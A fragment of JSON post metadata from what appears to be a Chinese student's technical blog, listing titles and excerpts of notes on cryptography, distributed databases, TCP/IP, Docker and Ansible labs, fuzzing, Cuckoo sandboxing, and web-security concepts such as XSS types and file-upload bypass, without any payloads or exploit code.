组装后补充：SA键帽在日常体验上确实没有xda那样舒适，尤其是用小指按压ctrl相当累人。","categories":[{"name":"随笔","slug":"essay","permalink":"https://hejueyun.github.io/categories/essay/"},{"name":"杂玩","slug":"essay/toys","permalink":"https://hejueyun.github.io/categories/essay/toys/"}],"tags":[{"name":"essay","slug":"essay","permalink":"https://hejueyun.github.io/tags/essay/"}]},{"title":"tcp-ip协议","date":"2020-08-17T17:09:32.000Z","path":"posts/2f4ac1e5/","slug":"tcp-ip协议","permalink":"https://hejueyun.github.io/posts/2f4ac1e5/","excerpt":"1. 概述 协议族 T C P &#x2F; I P协议族是一组不同的协 议组合在一起构成的协议族。尽管通常称该协议族为 T C P &#x2F; I P，但T C P和I P只是其中的两种协议而已","categories":[{"name":"Computer Network","slug":"Computer-Network","permalink":"https://hejueyun.github.io/categories/Computer-Network/"},{"name":"Notes","slug":"Computer-Network/Notes","permalink":"https://hejueyun.github.io/categories/Computer-Network/Notes/"}],"tags":[{"name":"Notes","slug":"Notes","permalink":"https://hejueyun.github.io/tags/Notes/"}]},{"title":"信安小知识-5","date":"2020-08-17T13:41:17.000Z","path":"posts/961834f0/","slug":"信安小知识-5","permalink":"https://hejueyun.github.io/posts/961834f0/","excerpt":"1. dom based xss vs reflected xss What is the Difference Between DOM Based XSS and Reflected XSS - Pediaa.Com 定义 DOM-based XSS is an advanced type of XSS that occurs by writing data to the Document Object Model (DOM). reflected XSS is the second and the most common type XSS in which the attacker’s payload is a part of the request that is sent to the webserver 基于DOM的XSS是一种先进的XSS类型，它通过向文档对象模型（DOM）写入数据而发生。&gt; - 反射式XSS是第二种也是最常见的XSS类型，攻击者的有效载荷是发送到网络服务器的请求的一部分 效果 While DOM-based XSS occurs by processing data from an untrusted source by writing data to a potentially dangerous sink within the DOM, reflected XSS occurs when an application obtains data in an HTTP request and includes that data within the immediate response in an unsafe way. Thus, this is the main difference between DOM based XSS and reflected XSS. 基于DOM的XSS是通过将数据写入DOM中的潜在危险汇来处理来自不受信任源的数据，而反射式XSS则是当应用程序在HTTP请求中获取数据，并以不安全的方式将该数据包含在即时响应中时发生的。因此，这是基于DOM的XSS和反射式XSS的主要区别。 DOM XSS 是由于浏览器解析机制导致的漏洞，服务器不参与，而存储型与反射型都需要服务器响应参与 DOM-based XSS 与存储性 XSS、反射型 XSS 有什么区别？ - 全栈工程师小家的回答 - 知乎","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Web Security","slug":"Security/Web-Security","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/"},{"name":"Note","slug":"Security/Web-Security/Note","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/Note/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"密码学备忘录-数字签名","date":"2020-08-05T14:13:03.000Z","path":"posts/15fc72d8/","slug":"密码学备忘录-数字签名","permalink":"https://hejueyun.github.io/posts/15fc72d8/","excerpt":"数字签名的作用是证明数字信息或文件在被签署时没有被有意或无意地修改。 数字签名通过生成信息或文件的唯一哈希值并使用发件人的私钥对其进行加密来实现。 1. 诉求 真实性 完整性 不可抵赖性 2. 消息签名的两种方法 对消息整体签名 对消息摘要签名 先签名后加密 3. 对称密码签名vs 公钥密码体制签名 vs 专门的数字签名算法对称 Alice可以假称密钥丢失否认签名，Bob可以冒充Alice签名 不适用于多人系统公钥 计算量大，速度慢 不验证签名就无法获得消息明文，不适用于特殊场合 3.1. 直接数字签名 Direct Digital Signature 不涉及第三方 假设接收者有发送者公钥 可以假称私钥丢失 RSA可实现 ElGamal数字签名方案 并非Elgamal加密逆过程 the difficulty of a certain problem in G related to computing discrete logarithms.","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Cryptography","slug":"Security/Cryptography","permalink":"https://hejueyun.github.io/categories/Security/Cryptography/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hejueyun.github.io/tags/Note/"}]},{"title":"密码学备忘录-哈希函数","date":"2020-08-05T14:12:47.000Z","path":"posts/b0b1300c/","slug":"密码学备忘录-哈希函数和消息认证","permalink":"https://hejueyun.github.io/posts/b0b1300c/","excerpt":"1. 散列函数 哈希函数H是一公开函数，用于将任意长的消息M映射为较短的、固定长度的一个值H(N)，作为认证符。 称函数值H(M)为杂凑值、杂凑码、散列值、散列码或消息摘要等 散列码（message authentication code）是消息的“指纹” 散列码是消息中所有比特参与运算产生的，因此提供了一种错误检测能力，即改变消息中任何一个比特或几个比特都会使散列码发生改变 1.1. Trapdoor One-Way Function（单向陷门函数） A trapdoor one-way function is a one-way function with an additional requirement. Informally, a one-way function might be described as a function for which evaluation in one direction is straightforward, while computation in the reverse direction is far more difficult. Such a function becomes a trapdoor one-way function when we add the requirement that computation in the reverse direction becomes straightforward when some additional (trapdoor) information is revealed. 1.2. 特性 A hash function is a single,fully defined, computable function which takes as input bit sequences of arbitrary（任意的） length, and outputs values of a fixed length r (e.g. r &#x3D; 256 bits for SHA-256). A hash function h is deemed secure if: It is computationally infeasible to find preimages: given a r-bit value x, it is not feasible to find m such that h(m) &#x3D; x. 不可逆 It is computationally infeasible to find second preimages: given m, it is not feasible to find m’ distinct from m, such that h(m) &#x3D; h(m’). 抗弱 It is computationally infeasible to find collisions: it is not feasible to find m and m’, distinct from each other, such that h(m) &#x3D; h(m’). 抗强 1.3. MD5 算法的输入分为512比特长的分组 输出为128比特的消息摘要","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Cryptography","slug":"Security/Cryptography","permalink":"https://hejueyun.github.io/categories/Security/Cryptography/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hejueyun.github.io/tags/Note/"}]},{"title":"密码学备忘录-公钥密码","date":"2020-08-05T14:12:13.000Z","path":"posts/a3c08fa8/","slug":"密码学备忘录-公钥密码","permalink":"https://hejueyun.github.io/posts/a3c08fa8/","excerpt":"1. 对称密码体制的局限性 密钥分发问题 可信信道 密钥量问题 密钥量太大 n个用户n(n-1)&#x2F;2个密钥 数字签名问题 通信双方共享一个密钥，用该密钥进行加密生成签名，无法防止通信双方的抵赖和欺骗行为 无法解决陌生人之间的身份认证和交易信息认证问题 2. 公钥密码设计要求 计算是容易的 分析是不可行的 加密变换和解密变换可以互换顺序 核心：单向陷门函数 从一个方向求值是容易的，而其逆向计算却很困难，以至于在实际上是不可行的。 3. 算法分类 RSA 基于大整数因子分解的公钥密码 ElGamal 基于有限域乘法群上的离散对数问题的公钥密码 ECC 基于椭圆曲线上的离散对数问题的公钥密码 3.1. RSA","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Cryptography","slug":"Security/Cryptography","permalink":"https://hejueyun.github.io/categories/Security/Cryptography/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hejueyun.github.io/tags/Note/"}]},{"title":"密码学备忘录-序列密码","date":"2020-08-05T14:11:57.000Z","path":"posts/888be22d/","slug":"密码学备忘录-序列密码","permalink":"https://hejueyun.github.io/posts/888be22d/","excerpt":"1. 定义 从一个短的密钥产生一个随机的密钥序列 与分组密码区别 相反，序列密码处理的明文长度可以小到lbit，而且序列密码是有记忆的，有时，序列密码又被称作状态密码，因为它的加密不仅与密钥和明文有关，而且还和当前的状态有关。 另外，分组密码算法的设计关键在于加解密算法，使明文和密文之间的关联在密钥的控制下尽可能复杂 而序列密码算法的设计关键在于密钥序列产生器，使生成的密钥序列具有尽可能高的不可预测性 2. 分类2.1. 同步序列密码 密钥序列的产生独立于明文消息和密文消息 OFB 错误传播","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Cryptography","slug":"Security/Cryptography","permalink":"https://hejueyun.github.io/categories/Security/Cryptography/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hejueyun.github.io/tags/Note/"}]},{"title":"密码学备忘录-分组密码","date":"2020-08-05T14:10:40.000Z","path":"posts/771ac171/","slug":"密码学备忘录-分组密码","permalink":"https://hejueyun.github.io/posts/771ac171/","excerpt":"1. 块密码（block cipher）定义 将明文消息编码表示后的二进制序列，划分成固定大小的块，每块分别在密钥的控制下变换成等长的二进制序列。 密文块的任意一位与明文块的所有位相关，从而如果明文的单个位发生了变化，那么平均将有一半的密文块的位也要发生变化 区别于夺标代换密码：维吉尼亚密码中，明文块中单个字符的改变只是导致密文块中单个字符的改变。 1.1. Number of keys for ideal block cipher 2. 设计原则Shannon:混淆原则和扩散原则 （**Confusion and Diffusion**） 混淆 所设计的密码应使得密钥和明文以及密文之间的依赖关系相当复杂，以至于这种依赖性对密码分析者来说是无法利用的 代换 扩散 所设计的密码应使得密钥的每一位数字影响密文的许多位数字，以防止对密钥进行逐段破译 置换 SP网络(Substitution Permutation Network) 代换-置换网络 迭代密码的一种","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Cryptography","slug":"Security/Cryptography","permalink":"https://hejueyun.github.io/categories/Security/Cryptography/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hejueyun.github.io/tags/Note/"}]},{"title":"密码学备忘录-古典密码与现代密码简介","date":"2020-08-05T14:09:28.000Z","path":"posts/c4fba1f0/","slug":"密码学备忘录-古典密码","permalink":"https://hejueyun.github.io/posts/c4fba1f0/","excerpt":"1. 古典密码 置换密码 代换密码 乘积密码 2. 置换密码 Permutation Cipher 根据一定的规则重新排列明文，以便打破明文的结构特性。 3. 代换密码 Substitution Cipher 基本方法:建立一个代换表，加密时将明文字符通过查表代换为对应的密文字符。 代换表就是密钥。 3.1. 单表代换密码(Monoalphabetic Cipher)凯撒密码（Caesar[ˈsiːzə(r)] Cipher） 原理: 将每个字母用其后的第三个字母替换。 $E_n(x)&#x3D;(x+n)mod26$ $D_n(x)&#x3D;(x-n)mod26$","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Cryptography","slug":"Security/Cryptography","permalink":"https://hejueyun.github.io/categories/Security/Cryptography/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hejueyun.github.io/tags/Note/"}]},{"title":"信安小知识-4","date":"2020-07-21T21:49:14.000Z","path":"posts/e11f0466/","slug":"信安小知识-4","permalink":"https://hejueyun.github.io/posts/e11f0466/","excerpt":"1. 文件包含 php文件包含漏洞 Web安全实战系列：文件包含漏洞 - FreeBuf网络安全行业门户 2. 文件上传绕过（file upload bypass） 常见的文件上传的检测方式与绕过的方法-狐灵网络科技 BookFresh Tricky File Upload Bypass to RCE | SECURITY GEEK bypass php-gd library i came with an idea to compare the gif images before and after it get converted using php-gd and search for any similarity between them , so if i find a similar part in the original file that was kept also after converting using the php-gd then i can inject my php code in that part and get RCE 3. 命令注入长度限制绕过 挖洞经验 | 命令注入突破长度限制 命令注入长度限制绕过 - ctrl_TT豆 - 博客园 4. 变量覆盖5. /etc/shadow 目前 Linux 的密码采用的是 SHA512 散列加密算法 很多软件透过这个功能，在密码串前加上 “!”、”*” 或 “x” 使密码暂时失效 Linux &#x2F;etc&#x2F;shadow（影子文件）内容解析（超详细）","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Web Security","slug":"Security/Web-Security","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/"},{"name":"Note","slug":"Security/Web-Security/Note","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/Note/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"模糊测试实验","date":"2020-07-19T23:59:10.000Z","path":"posts/7123f4dc/","slug":"模糊测试Fuzzing","permalink":"https://hejueyun.github.io/posts/7123f4dc/","excerpt":"1. 实验原理1.1. 模糊测试 模糊测试 （fuzz testing, fuzzing）是一种软件测试技术。其核心思想是将自动或半自动生成的随机数据输入到一个程序中，并监视程序异常，如崩溃，断言（assertion）失败，以发现可能的程序错误，比如内存泄漏。模糊测试常常用于检测软件或计算机系统的安全漏洞。 模糊测试工具主要分为两类，变异测试（mutation-based）以及生成测试（generation-based）。模糊测试可以被用作白盒，灰盒或黑盒测试 1.2. 黑盒、白盒、灰盒测试 黑盒测试关注程序的功能是否正确，面向实际用户； 白盒测试关注程序源代码的内部逻辑结构是否正确，面向编程人员； 灰盒测试是介于白盒测试与黑盒测试之间的一种测试。 所以通俗来讲黑盒测试就是看我开始用一个软件，它可以满足我的需求不出错吗？白盒测试就是我写的程序代码是不是没有问题呢，我得在源程序中看看。灰盒测试就是综合两种测试策略 1.3. boofuzz Boofuzz is a fork of and the successor to the venerable Sulley fuzzing framework. Besides numerous bug fixes, boofuzz aims for extensibility. The goal: fuzz everything. 1.4. BinWalk Binwalk是一个快速、易用的工具，用于分析、逆向工程和提取固件图像。 1.5. QEMU","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Software Security","slug":"Security/Software-Security","permalink":"https://hejueyun.github.io/categories/Security/Software-Security/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"Dockerfile实验","date":"2020-07-12T16:46:25.000Z","path":"posts/bf5c901b/","slug":"dockfile实验","permalink":"https://hejueyun.github.io/posts/bf5c901b/","excerpt":"1. 实验内容 使用容器技术重构FTP、NFS、DHCP、DNS、Samba服务器的自动安装与自动配置 将编写好的dockerfile传到docker hub，自动构建 2. 实验原理2.1. 常用命令12345$ docker ps // 查看所有正在运行容器 $ docker stop containerId // containerId 是容器的ID $ docker ps -a // 查看所有容器 $ docker ps -a -q // 查看所有容器ID $ docker stop $(docker ps -a -q) // stop停止所有容器 $ docker rm $(docker ps -a -q) // remove删除所有容器 2.2. 镜像构成2.2.1. docker exec1234$ docker exec -it webserver bashroot@3729b97e8226:/# echo &#x27;&lt;h1&gt;Hello, Docker!&lt;/h1&gt;&#x27; &gt; /usr/share/nginx/html/index.htmlroot@3729b97e8226:/# exitexit 2.2.2. docker diff 在docker exec交互式终端中修改了容器的文件，也就是改动了容器的存储层。我们可以通过 docker diff 命令看到具体的改动","categories":[{"name":"Operating System","slug":"Operating-System","permalink":"https://hejueyun.github.io/categories/Operating-System/"},{"name":"Linux","slug":"Operating-System/Linux","permalink":"https://hejueyun.github.io/categories/Operating-System/Linux/"},{"name":"Lab","slug":"Operating-System/Linux/Lab","permalink":"https://hejueyun.github.io/categories/Operating-System/Linux/Lab/"}],"tags":[{"name":"Lab","slug":"Lab","permalink":"https://hejueyun.github.io/tags/Lab/"}]},{"title":"ansible实验","date":"2020-07-09T19:37:21.000Z","path":"posts/b9cbd385/","slug":"ansible实验","permalink":"https://hejueyun.github.io/posts/b9cbd385/","excerpt":"1. 实验内容 使用ansible技术重构FTP、NFS、DHCP、DNS、Samba服务器的自动安装与自动配置 2. 实验环境 机器 HostOnly IP地址 Control node 192.168.50.129 Managed nodes 192.168.50.130 3. 实验原理Ansible Ansible是一个开源配置管理工具，可以使用它来自动化任务，部署应用程序实现IT基础架构。Ansible可以用来自动化日常任务，比如，服务器的初始化配置、安全基线配置、更新和打补丁系统，安装软件包等。 无需客户端 Ansible是无客户端Agent的，所以无需在客户机上安装或配置任何程序，就可以运行Ansible任务。由于Ansible不会在客户机上安装任何软件或运行监听程序，因此消除了许多管理开销，同时Ansible的更新也不会影响任何客户机。 虽说如此，还是要在目标节点配置python依赖使用SSH进行通讯 默认情况下，Ansible使用SSH协议在管理机和客户机之间进行通信。可以使用SFTP与客户机进行安全的文件传输 Ansible ad-hoc单行命令执行 ad-hoc命令行是我们可以随手执行的单个ansible任务，是ansible任务快速执行方式 Ansible Playbook","categories":[{"name":"Operating System","slug":"Operating-System","permalink":"https://hejueyun.github.io/categories/Operating-System/"},{"name":"Linux","slug":"Operating-System/Linux","permalink":"https://hejueyun.github.io/categories/Operating-System/Linux/"},{"name":"Lab","slug":"Operating-System/Linux/Lab","permalink":"https://hejueyun.github.io/categories/Operating-System/Linux/Lab/"}],"tags":[{"name":"Lab","slug":"Lab","permalink":"https://hejueyun.github.io/tags/Lab/"}]},{"title":"shell脚本编程练习进阶","date":"2020-07-05T15:31:52.000Z","path":"posts/d86c0fc1/","slug":"shell脚本编程练习进阶","permalink":"https://hejueyun.github.io/posts/d86c0fc1/","excerpt":"1. 实验目的 FTP、NFS、DHCP、Samba、DNS服务器的自动安装与自动配置 配置远程目标主机的SSH免密root登录，安装脚本、配置文件可以从工作主机（执行启动脚本所在的主机）上通过scp或rsync方式拷贝或同步到远程目标主机，然后再借助SSH的远程命令执行功能实现远程控制安装和配置 2. 实验环境 host: ubuntu 18.04.4 wsl server:ubuntu 18.04.4 server 192.168.50.129 3. 实验原理3.1. FTP FTP是 File Transfer Protocol （文件传输协议）的英文简称，而中文简称为“文传协议”。用于Internet 上的控制文件的双向传输。同时，它也是一个应用程序（ Application ） FTP的默认端口是20,21FTP的端口号20、21的区别一个是数据端口，一个是控制端口，控制端口一般为21，而数据端口不一定是20，这和FTP的应用模式有关，如果是主动模式，应该为20，如果为被动模式，由服务器端和客户端协商而定。 FTP主动模式：客户端从一个任意的端口N（N&gt;1024）连接到FTP服务器的port 21命令端口，客户端开始监听端口N+1，并发送FTP命令“port N+1”到FTP服务器，FTP服务器以数据端口（20）连接到客户端指定的数据端口（N+1）。 FTP被动模式：客户端从一个任意的端口N（N&gt;1024）连接到FTP服务器的port 21命令端口，客户端开始监听端口N+1，客户端提交 PASV命令，服务器会开启一个任意的端口（P &gt;1024），并发送PORT P命令给客户端。客户端发起从本地端口N+1到服务器的端口P的连接用来传送数据。 3.2. vsftpd vsftpd 是“ very secure FTP daemon ”的缩写，安全性是它的一个最大的特点。 vsftpd是一个 UNIX 类操作系统上运行的服务器的名字，它可以运行在诸如 Linux 、 BSD 、 Solaris 、HP UNIX 等系统上面，是一个完全免费的、开放源代码的 ftp 服务器软件，支持很多其他的FTP 服务器所不支持的特征。 3.2.1. 匿名登录","categories":[{"name":"Operating System","slug":"Operating-System","permalink":"https://hejueyun.github.io/categories/Operating-System/"},{"name":"Linux","slug":"Operating-System/Linux","permalink":"https://hejueyun.github.io/categories/Operating-System/Linux/"},{"name":"Lab","slug":"Operating-System/Linux/Lab","permalink":"https://hejueyun.github.io/categories/Operating-System/Linux/Lab/"}],"tags":[{"name":"Lab","slug":"Lab","permalink":"https://hejueyun.github.io/tags/Lab/"}]},{"title":"高级数据库笔记-事务管理","date":"2020-07-03T10:28:38.000Z","path":"posts/826fda36/","slug":"高级数据库笔记-事务管理","permalink":"https://hejueyun.github.io/posts/826fda36/","excerpt":"1. 事务的定义 事务(transaction)是由若干个为完成某一任务而逻辑相关的操作组成的操作序列，是保证数据库正确性的基本逻辑单元 一个事务由三部分组成 开始标识begin_transaction 数据库操作 结束标识commit或abort 1.1. 事务的基本性质ACID四个特性 原子性(atomicity) 表示组成一个事务的多个数据库操作是一个不可分割的原子单元，只有所有的操作执行成功，整个事务才提交。事务中的任何一个数据库操作失败，已经执行的任何操作都必须被撤销，让数据库返回初始状态 一致性(consistency) 事务操作成功后，数据库所处的状态和他的业务规则是一致的，即数据不会被破坏。如A账户转账100元到B账户，不管操作成功与否，A和B账户的存款总额是不变的 隔离性(isolation) 在并发数据操作时，不同的事务拥有各自的数据空间，他们的操作不会对对方产生敢逃。准确地说，并非要求做到完全无干扰。数据库规定了多种事务隔离界别，不同的隔离级别对应不用的干扰成都，隔离级别越高，数据一致性越好，但并发行越弱 耐久性(或持久性,durability) 一旦事务提交成功后，事务中所有的数据操作都必须被持久化到数据库中。即使在事务提交后，数据库马上崩溃，在数据库重启时，也必须保证能够通过某种机制恢复数据 在这些事务特性中，数据“一致性”时最终目标，其他特性都是为达到这个目标而采取的措施、要求或手段 2. 分布式事务 从宏观上来看，分布式事务是由一系列分布在多 个场地上执行的数据库操作所组成的 分布式事务：是指分布式数据库应用中的事务，也称为全局事务 分布式事务：是指分布式数据库应用中的事务，也称为全局事务 实现模型 进程模型 全局事务为每一个子 事务在相应的场地上创建一个代理者 进程（也称局部进程或子进程），由 代理者进程执行该场地上的有关操作。 同时，为协调各子事务的操作，全局 事务还要启动一个协调者进程，来进行代理者进程间的通讯，控制和协调 各代理者进程的操作 服务器模型 服务器模型要求在事务的每个执行场地上创建一个服务 器进程，用于执行发生在该场地上的所有子事务。每个服务器进程可以交 替地为多个事务的子事务服务。也就是说，不同全局事务中的子事务在同 一个场地上共用一个服务器进程 2.1. 分布式事务管理的实现","categories":[{"name":"Sql","slug":"Sql","permalink":"https://hejueyun.github.io/categories/Sql/"},{"name":"Notes","slug":"Sql/Notes","permalink":"https://hejueyun.github.io/categories/Sql/Notes/"}],"tags":[{"name":"Notes","slug":"Notes","permalink":"https://hejueyun.github.io/tags/Notes/"}]},{"title":"高级数据库笔记-分布查询","date":"2020-07-02T22:41:36.000Z","path":"posts/b406cf95/","slug":"高级数据库笔记-分布查询","permalink":"https://hejueyun.github.io/posts/b406cf95/","excerpt":"1. 概述 输入：片段查询 输出：分布执行计划 找到好的（不必最优的）全局调度 基于代价的优化 搜索空间(Solution space) 代价函数(Cost function) I/O 代价 + CPU 代价+ communication代价 搜索算法(Search algorithm) 2. 优化的理论基础 分布执行过程实际上就是从查询场地发出查询命令、从数据源获取数据、确定最佳的执行场地和返回执行结果的过程 查询场地：指发出查询命令和存储最终查询结果的场地 源数据场地：指查询命令需要访问的数据副本所在的场地，可能涉及到一个或一个以上的场地 执行场地：指查询操作执行所在的场地。 执行场地可以和查询场地或源数据场地处于同一场地，也可不处于同一场地 2.1. 内容 确定执行查询的站点和需要移动的副本 确定片段查询表达式操作执行的最优顺序 重点是并操作和联接操作 选择执行每个操作的方法 如：尽量将同一场地上的、 同一物理副本的全部操作组合在一起统一考虑完成 2.2. 代价模型 主要指传输代价（Ccom）、I&#x2F;O代价（CIO）和CPU代价（Ccpu） $Total cost &#x3D; C_{com}+C_{IO}+C_{cpu}$ 传输代价 费用 延迟 其中费用起决定作用 $C_{COM}（X）&#x3D;C_0+C_1*X$ $C_0$：场地间传输数据的启动所需的固定费用（启动一次）， 简称启动代价 $C_1$：网络单位传输数据费用，简称单位传输代 $X$：需传输的数据量 I&#x2F;O代价 $C_{IO}（X）&#x3D;[X&#x2F;P]*C_{IO}$ P：页面的大小 X：数据量大小 $C_{IO}$：为每页平均访问代价 CPU代价 $C_{CPU}（X）&#x3D;X*C&lt;{CPU}$ $C_{CPU}$：单位指令代价 X：为指令数","categories":[{"name":"Sql","slug":"Sql","permalink":"https://hejueyun.github.io/categories/Sql/"},{"name":"Notes","slug":"Sql/Notes","permalink":"https://hejueyun.github.io/categories/Sql/Notes/"}],"tags":[{"name":"Notes","slug":"Notes","permalink":"https://hejueyun.github.io/tags/Notes/"}]},{"title":"高级数据库笔记-全局查询","date":"2020-07-02T22:41:10.000Z","path":"posts/a1b047/","slug":"高级数据库笔记-全局查询","permalink":"https://hejueyun.github.io/posts/a1b047/","excerpt":"1. 查询优化的基础 优化就是寻找执行代价（费用和时间）最小的查询执 行策略，使系统执行效率降到最低 局部执行代价 主要指输入&#x2F;输出次数（I&#x2F;O代价）及CPU 处理代价 数据只有读到内存才能进行连接 网络传输代价 指传输启动代价和数据传输代价 要读写的块数&#x2F;每秒读写的块数&#x3D;代价 1.1. 优化的内容 执行运算的次序 执行每种运算的方法 所访问的副本场地。如：选择就近的场地，节约传输代价 执行运算的场地的选择，使总的传输代价或总代价最低 1.2. 关系代数 1.2.1. 等价变换 1.3. 查询树","categories":[{"name":"Sql","slug":"Sql","permalink":"https://hejueyun.github.io/categories/Sql/"},{"name":"Notes","slug":"Sql/Notes","permalink":"https://hejueyun.github.io/categories/Sql/Notes/"}],"tags":[{"name":"Notes","slug":"Notes","permalink":"https://hejueyun.github.io/tags/Notes/"}]},{"title":"高级数据库笔记-设计","date":"2020-07-02T18:10:29.000Z","path":"posts/f72c74d3/","slug":"高级数据库笔记-设计","permalink":"https://hejueyun.github.io/posts/f72c74d3/","excerpt":"1. 两种设计策略 Top_Down 新设计一个数据库系统 Bottom-UP 已存在许多数据库系统，并将 它们集成为一个数据库 1.1. Top_Down 需求分析（Requirement analysis） 概念设计、视图集成、E-R 表示 分布设计、数据分片和分配 物理设计 性能调优（Tuning） 2. 分片的定义 分片（Fragmentation)：对全局数据的划分。 片段（Fragment）：是分布式数据库中数据的存储单位。划分的结果称为片段。 分配（Allocation）：对片段存储场地的指定，称为分配。 当片段存储在一个以上场地时，称为数据复制 （Replication）存储。 如果每个片段只存储在一个场地，称为数据分割（Partition）存储 2.1. 关系","categories":[{"name":"Sql","slug":"Sql","permalink":"https://hejueyun.github.io/categories/Sql/"},{"name":"Notes","slug":"Sql/Notes","permalink":"https://hejueyun.github.io/categories/Sql/Notes/"}],"tags":[{"name":"Notes","slug":"Notes","permalink":"https://hejueyun.github.io/tags/Notes/"}]},{"title":"高级数据库笔记-体系结构","date":"2020-07-02T17:54:44.000Z","path":"posts/6b9aa3b4/","slug":"高级数据库笔记-体系结构","permalink":"https://hejueyun.github.io/posts/6b9aa3b4/","excerpt":"1. 定义 指按组件、组件功能 以及它们的交互作用定义系统的结构 1.1. 分类 应用处理器(AP) 用于完成分布数 据处理的软件，如：处理访问多 个场地的请求， 查询全局字典中 分布信息等。 通信管理器(CM) 应用处理器(AP) 用于完成分布数 据处理的软件， 如：处理访问多个场地的请求， 查询全局字典中 分布信息等。 数据处理器(DP) 负责进行数据管理的软件，类似 于一个集中式数 据库管理系统 （DBMS）","categories":[{"name":"Sql","slug":"Sql","permalink":"https://hejueyun.github.io/categories/Sql/"},{"name":"Notes","slug":"Sql/Notes","permalink":"https://hejueyun.github.io/categories/Sql/Notes/"}],"tags":[{"name":"Notes","slug":"Notes","permalink":"https://hejueyun.github.io/tags/Notes/"}]},{"title":"高级数据库笔记-概述","date":"2020-07-02T17:18:02.000Z","path":"posts/7ec21a99/","slug":"高级数据库笔记-概述","permalink":"https://hejueyun.github.io/posts/7ec21a99/","excerpt":"1. 基本概念数据库（DB）设计 对一个给定的应用环境（现实 世界）设计最优的数据模型 数据库管理系统（DBMS） 人们用于管理和操 作数据库的软件产品,人们用于管理和操 作数据库的软件产品 基本模块 用户接口 查询处理 查询优化 存储管理 辅助模块 基本模块 事务管理 恢复管理","categories":[{"name":"Sql","slug":"Sql","permalink":"https://hejueyun.github.io/categories/Sql/"},{"name":"Notes","slug":"Sql/Notes","permalink":"https://hejueyun.github.io/categories/Sql/Notes/"}],"tags":[{"name":"Notes","slug":"Notes","permalink":"https://hejueyun.github.io/tags/Notes/"}]},{"title":"记一次win10用户权限设置","date":"2020-07-01T14:56:47.000Z","path":"posts/6e7ebaaf/","slug":"记一次win10用户权限设置","permalink":"https://hejueyun.github.io/posts/6e7ebaaf/","excerpt":"1. 将用户权限提升为管理员 首先进入安全模式 更新与安全-恢复-立即重启 疑难解答-高级选项-启动设置 F4&#x2F;4进入安全模式 以管理员账号登陆（密码默认为空） 控制面板-用户账户-更改账户类型 2. 切换用户从结果上看，相当于在锁屏界面有多个用户可以切换着登录 win+R-compmgmt.msc 系统工具-本地用户和组 选择要切换的用户 右键属性-隶属于-添加-高级-立即查找-选择要加的组 比如当前用户是Administrator组，就把他加入到这个组就行 可以在任务管理器看到“新出现”的用户 3. 参考 win10出现若要继续,请输入管理员用户账户和密码-百度经验","categories":[{"name":"Operating System","slug":"Operating-System","permalink":"https://hejueyun.github.io/categories/Operating-System/"},{"name":"Windows","slug":"Operating-System/Windows","permalink":"https://hejueyun.github.io/categories/Operating-System/Windows/"}],"tags":[]},{"title":"Cuckoo","date":"2020-07-01T14:55:36.000Z","path":"posts/5b45c153/","slug":"Cuckoo","permalink":"https://hejueyun.github.io/posts/5b45c153/","excerpt":"1. 实验要求 安装并使用cuckoo，任意找一个程序，在cuckoo中trace获取软件行为的基本数据。 2. 实验原理2.1. Cuckoo Sandbox Cuckoo Sandbox是一款用于自动分析可疑文件的开源软件。为此，它利用自定义组件，监控恶意进程在隔离环境中运行时的行为。 用处: Generic Windows executables DLL files PDF documents Microsoft Office documents URLs and HTML files PHP scripts CPL files Visual Basic (VB) scripts ZIP files Java JAR Python files Almost anything else 2.1.1. 架构 Cuckoo基础架构的主要组成部分是一台Host机器（管理软件）和一些Guest机器（用于分析的虚拟机或物理机）。 Host运行着管理整个分析过程的沙箱核心组件，而Guest机则是恶意软件样本实际安全执行和分析的隔离环境。 2.2. Sandboxing 在计算机安全中，沙箱是一种分离运行程序的安全机制。它通常用于执行未经测试的代码，或来自未经验证的第三方、供应商、不受信任的用户和不受信任的网站的不受信任的程序 恶意软件沙箱是动态分析方法的实际应用：不是静态分析二进制文件，而是实时执行和监控。它是一种有价值的技术，可以获得恶意软件的额外细节，如其网络行为。因此，在检查一个恶意软件时，同时进行静态和动态分析是一个很好的做法，以便更深入地了解它 你的目标应该是既要创建一个能够处理你所需要的所有要求的系统，同时也要尽量使其符合实际情况。 比如你可以考虑在正常使用的情况下故意留下一些痕迹，比如浏览历史、cookies、文档、图片等。如果一个恶意软件是为了操作、操纵或窃取这类文件，你就能注意到它。 2.3. 实验环境","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Software Security","slug":"Security/Software-Security","permalink":"https://hejueyun.github.io/categories/Security/Software-Security/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"符号执行","date":"2020-07-01T12:15:23.000Z","path":"posts/5f259496/","slug":"符号执行","permalink":"https://hejueyun.github.io/posts/5f259496/","excerpt":"1. 实验要求 